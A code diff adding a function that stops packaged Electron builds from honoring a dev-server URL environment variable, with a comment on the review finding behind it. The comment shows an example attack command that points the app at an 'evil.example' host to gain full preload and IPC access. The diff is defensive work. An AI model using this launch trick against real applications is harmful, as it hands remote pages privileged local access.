@@ -55,6 +55,32 @@ export function isTrustedAppUrl(url: string, config: OriginPolicyConfig): boolea
   return false;
 }
 
+/**
+ * Resolve the trusted dev-server URL for `mainWindow.loadURL`, the
+ * origin-policy config, and the "is the local adapter-node server needed"
+ * check — the ONE gate all three call sites in main.ts must share (ARCH
+ * review finding #1, CRITICAL).
+ *
+ * A packaged build must NEVER honor `VITE_DEV_SERVER_URL`. Without this
+ * gate, an attacker who launches the packaged binary with that env var set
+ * (e.g. `VITE_DEV_SERVER_URL=https://evil.example ./print-md-viewer`) could
+ * point the window at remote content AND have that origin added to the
+ * trusted-origin policy that guards the full IPC bridge (`secureHandle` /
+ * `isTrustedIpcSender`) and top-frame navigation (`decideNavigation`) — full
+ * preload access for a remote page.
+ *
+ * `isPackaged` must be `app.isPackaged` from the caller — kept as a plain
+ * boolean parameter (not read from `electron` here) so this decision stays
+ * pure and directly unit-testable like the rest of this module.
+ */
+export function resolveDevServerUrl(
+  isPackaged: boolean,
+  envValue: string | undefined,
+): string | null {
+  if (isPackaged) return null;
+  return envValue || null;
+}
+
 export type NavigationDecision =
   | { action: "allow" }
   | { action: "open-external"; url: string }
